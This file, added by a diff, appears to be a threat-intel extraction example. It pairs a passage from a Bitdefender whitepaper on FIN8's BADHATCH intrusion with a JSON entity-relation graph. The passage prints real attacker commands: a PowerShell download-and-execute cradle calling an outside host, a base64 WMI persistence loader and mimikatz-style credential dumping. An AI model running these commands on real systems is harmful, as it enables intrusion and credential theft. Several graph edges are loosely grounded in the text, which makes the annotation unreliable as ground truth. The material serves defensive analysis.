@@ -1,0 +1,82 @@
+
+
+
+Sentence : Attack scenario
+To get a clearer picture of how attackers operated after compromising the victim, we collected the related command
+lines and grouped them by tactics while preserving the chronology of events:
+|Kill chain step|Commands|Remark|MITRE TTPS|
+|---|---|---|---|
+|~~Initial Access~~||~~unknown~~||
+|~~Privilege~~Escalation|•  cmd.exe /Q /c cd \ 1> \\127.0.0.1\AD-MIN$\__1607046502.0308208 2>&1•   cmd.exe /Q /c cd 1> \\127.0.0.1\AD-MIN$\__1607046502.0308208 2>&1•  cmd.exe /Q /c powershell.exe -nop$pa=’sys’;iex (New-Object Sys-tem.Net.WebClient).Download-String(‘https://192-129-189-73.sslip.io/yo’) 1> \\127.0.0.1\AD-MIN$\__1607046502.0308208 2>&1•   cmd.exe /Q /c ping -n 18.8.8.8 1> \\127.0.0.1\AD-MIN$\__1607046502.0308208 2>&1•    cd Windows\Temp•    dir sh-tmp.ps1• powershell.exe -nop -ep bypass -c C:\Windows\Temp\sh-tmp.ps1 sys|~~This group of~~commands reflectthe deployment ofBADHATCH malwarewhich we believeis responsible fordownloading the sh-tmp.ps1 script.Although we wereunable to obtain thesh-tmp.ps1, manythings indicatethat this script isresponsible for theprivilege escalationstep. The mostimportant clueis that after thescript execution,all subsequentcommands areexecuted on behalf ofSYSTEM user.|•  Process Injec-tion(T1055)•  Asynchro-nous ProcedureCall(T1055.004)• Access Token Ma-nipulation(T1134)•  Create Process withToken( T1134.002)|
+|~~Persistence~~|•  powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff-68f41a8eb0b8739370640•   powershell.exe -nop -c System.Reflection.Assembly::Load(System.Convert::From-Base64String((WmiClass ‘root\cim-v2:Win32_Base64Class’).Properties’Prop’.Value));utYEb.a6Kxxs::Ye5d(10)|~~The telemetry data~~suggests thatthe m.ps1 scripthas installed thepersistence thattriggered the executionof the secondpresented PowerShellcommand line.|•   Event Triggered Exe-cution(T1546)•  Windows Manage-ment Instrumenta-tion Event Subscrip-tion(T1546.003)|
+9
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+|Kill chain step|Commands|Remark|MITRE TTPS|
+|---|---|---|---|
+|~~Discovery~~|systeminfo.exetasklist.exeipconfg.exe /allnet.exe group ”domain admins” /domainwhoami.exenetstat.exe –f|~~These commands~~reflect the systemfngerprinting|System InformationDiscovery(T1082)Process Discov-ery( T1057)System NetworkConfguration Discov-ery(T1016)Permission GroupsDiscovery(T1069)DomainGroups(T1069.002)System Owner/UserDiscovery(T1033)System NetworkConnections Discov-ery(T1049)|
+|~~Credential~~Access|powershell.exe -nop -ep bypass -c c:\win-dows\temp\mimi.ps1 786c34ba841a259d-0c8945503d0b6d89c46e9245|~~The name of the script~~suggests that this isprobably amimikatzscript, but this isspeculation becausewe were unable toget it. However, weare sure that thecredentials weredumped, because thefollowing commandsfrom Discovery wereexecuted on behalf ofanother domain user,probably a domainadmin. Moreover, thereare traces in telemetryfrom behavioralmonitoring (ATC)that the PowerShellprocess read thememory of lsass.exe|OS Credential Dump-ing(T1003)OS Credential Dump-ing: LSASS Memo-ry(T1003.001)Process Injec-tion(T1055)|
+10
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+|Kill chain step|Commands|Remark|MITRE TTPS|
+|---|---|---|---|
+|~~Discovery~~|tasklist.exe /vwhoami.exetasklist.exe /v| fndstr.exe explorernet.exe group “domain admins” /domainnltest.exe /domain_trustsping.exe –n 1 |~~The discovery of the~~Domain Controller.|Process Discov-ery( T1057)Permission GroupsDiscovery(T1069)DomainGroups(T1069.002)System Owner/UserDiscovery(T1033)Domain Trust Discov-ery(T1482)|
+|~~Lateral~~Movement|wmic.exe /node: pro-cess call create \cmd /c powershell.exe -nop $pa=’sys’;iex (New-ObjectSystem.Net.WebClient).Download-String(‘https://192-129-189-73.sslip.io/yo’)\””|~~The deployment of the~~BADHATCH on DomainController.|Windows ManagementInstrumentation(T1047)|
+|~~Other steps~~|cmd.exe /c powershell.exe -nop -ep bypass-c c:\windows\temp\m.ps1 sys|~~The telemetry data~~indicates that thesame persistence wasinstalled on DC.||
+The redirection of the output to “ 1> \\127.0.0.1\ADMIN$\__ 2>&1 ” suggests that the actor uses
+the wmiexec.py tool from Impacket.
+11
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "cmd.exe", "type" : "EXEF"},
+        {"id": 2, "description": "\\127.0.0.1\\ADMIN$\\__1607046502.0308208", "type" : "SYSP"},
+        {"id": 3, "description": "powershell.exe", "type" : "EXEF"},
+        {"id": 4, "description": "https://192-129-189-73.sslip.io/yo", "type" : "URLS"},
+        {"id": 5, "description": "C:\\Windows\\Temp\\sh-tmp.ps1", "type" : "DOCF"},
+        {"id": 6, "description": "BADHATCH malware", "type" : "TTPS"},
+        {"id": 7, "description": "SYSTEM user", "type" : "ACTO"},
+        {"id": 8, "description": "m.ps1 script", "type" : "DOCF"},
+        {"id": 9, "description": "f9eef8b27ff-68f41a8eb0b8739370640", "type" : "TPTH"},
+        {"id": 10, "description": "Event Triggered Execution (T1546)", "type" : "TTPS"},
+        {"id": 11, "description": "Windows Management Instrumentation Event Subscription (T1546.003)", "type" : "TTPS"},
+        {"id": 12, "description": "systeminfo.exe", "type" : "EXEF"},
+        {"id": 13, "description": "tasklist.exe", "type" : "EXEF"},
+        {"id": 14, "description": "ipconfig.exe /all", "type" : "EXEF"},
+        {"id": 15, "description": "net.exe group “domain admins” /domain", "type" : "EXEF"},
+        {"id": 16, "description": "whoami.exe", "type" : "EXEF"},
+        {"id": 17, "description": "netstat.exe –f", "type" : "EXEF"},
+        {"id": 18, "description": "mimi.ps1 script", "type" : "DOCF"},
+        {"id": 19, "description": "OS Credential Dumping (T1003)", "type" : "TTPS"},
+        {"id": 20, "description": "LSASS Memory (T1003.001)", "type" : "TTPS"},
+        {"id": 21, "description": "Process Injection (T1055)", "type" : "TTPS"},
+        {"id": 22, "description": "wmic.exe", "type" : "EXEF"},
+        {"id": 23, "description": "Domain Controller", "type" : "ACTO"},
+        {"id": 24, "description": "Windows Management Instrumentation (T1047)", "type" : "TTPS"},
+        {"id": 25, "description": "wmiexec.py tool from Impacket", "type" : "EXEF"},
+        {"id": 26, "description": "cmd.exe /c powershell.exe -nop -ep bypass-c c:\\windows\\temp\\m.ps1 sys", "type" : "TTPS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "redirect output to"},
+        {"source": 3, "target": 4, "rel_name" : "download from"},
+        {"source": 3, "target": 5, "rel_name" : "execute script"},
+        {"source": 6, "target": 7, "rel_name" : "used by"},
+        {"source": 8, "target": 9, "rel_name" : "contains parameter"},
+        {"source": 10, "target": 11, "rel_name" : "is a type of"},
+        {"source": 3, "target": 12, "rel_name" : "executes"},
+        {"source": 3, "target": 13, "rel_name" : "executes"},
+        {"source": 3, "target": 14, "rel_name" : "executes"},
+        {"source": 3, "target": 15, "rel_name" : "executes"},
+        {"source": 3, "target": 16, "rel_name" : "executes"},
+        {"source": 3, "target": 17, "rel_name" : "executes"},
+        {"source": 18, "target": 19, "rel_name" : "is a type of"},
+        {"source": 18, "target": 20, "rel_name" : "uses technique"},
+        {"source": 18, "target": 21, "rel_name" : "uses technique"},
+        {"source": 22, "target": 23, "rel_name" : "targets"},
+        {"source": 22, "target": 24, "rel_name" : "uses technique"},
+        {"source": 25, "target": 26, "rel_name" : "used in"}
+    ]
+}
